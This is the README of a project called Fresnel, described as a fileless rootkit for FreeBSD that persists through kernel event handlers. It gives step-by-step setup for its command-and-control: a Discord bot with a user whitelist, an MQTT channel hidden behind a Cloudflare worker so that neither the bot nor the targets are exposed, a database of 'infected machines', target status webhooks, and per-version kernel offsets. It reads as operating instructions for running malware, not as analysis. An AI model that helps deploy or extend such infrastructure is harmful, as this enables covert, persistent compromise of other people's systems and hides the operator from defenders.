# Fresnel

Fresnel is a hybrid fileless rootkit for FreeBSD. It uses EVENTHANDLERs ("ehooks") for persistence, but otherwise is resident entirely in memory

for a detailed breakdown on Fresnel itself, see `fresnel rootkit.pdf` (some details may be outdated)

by:
@fesari

@maahir-ahmed

@eeeeeeeeeevan

# Setup


## 1. Host requirements

- linux box with docker
- kvm passthrough. check by seeing if you can `ls /dev/kvm`.

```sh
ls -l /dev/kvm
```
- at least 15-20 gigs of free space for the FreeBSD base image and build VM

## 2. Setup the discord bot

Create `discord/.env`:

```
DISCORD_TOKEN=your-bot-token-here
GUILD_ID=your-guild-id-here
HMACKEY=replace-with-a-64-character-hex-secret
MQTT_WORKER=mrproxy.your-subdomain.workers.dev
MQTT_TOKEN=replace-with-the-worker-secret
WEBHOOK_URL=
```
for HMACKEY, just do `openssl rand -hex 32`.

MQTT_TOKEN must match the Worker secret named `TOKEN`.
WEBHOOK_URL allows fresnel to post target status notifs there

## 3. Create files

these must exist before starting the container

### Whitelist

This is to whitelist users for the bot.

```json
{
  "users": [
    "1234"
  ]
}
```

### Machine database

`machines.json` lists infected machines. touch one beforehand.

### Build output dir

```sh
mkdir -p discord/buildjunks
```

## 4. Create CF worker

The worker proxies a websocket connection to an MQTT broker so the bot and target never expose themselves in public MQTT sandboxes:

```sh
npx wrangler login
npx wrangler secret put TOKEN
npx wrangler deploy
```

`npx wrangler secret put TOKEN` will prompt for the same value you put in `MQTT_TOKEN` notably

after deploying, set `MQTT_WORKER` to the cloudflare worker you spun up

## 5. Deploy container

```sh
docker compose -f docker-compose.yml build --no-cache
```

Now, provision the FreeBSD base image:
```sh
docker compose -f discord/docker-compose.yml run --rm bot sh /app/discord/provision.sh
```

This requires KVM passthrough. after it finishes downloading, check that the image exists in the container, then start the bot:

```sh
docker compose -f docker-compose.yml up -d 
```

# CACHECALLER

CACHECALLER currently uses `download.freebsd.org`. You can change this at src/shellproxy/dd.c and discord/machines.py. For more information on CACHECALLER, check the pdf


# Version profiles

Fresnel supports different version profiles. by default, it targets 14.5-RELEASE, though you can fill in the offsets yourself or use ~~tools/dump.py~~ (soon tm) to automatically generate offsets. this is still very early, see `versions/freebsd-14.5-RELEASE-amd64.json`.

If you dont know how to dump these use an agent or some shit idk lol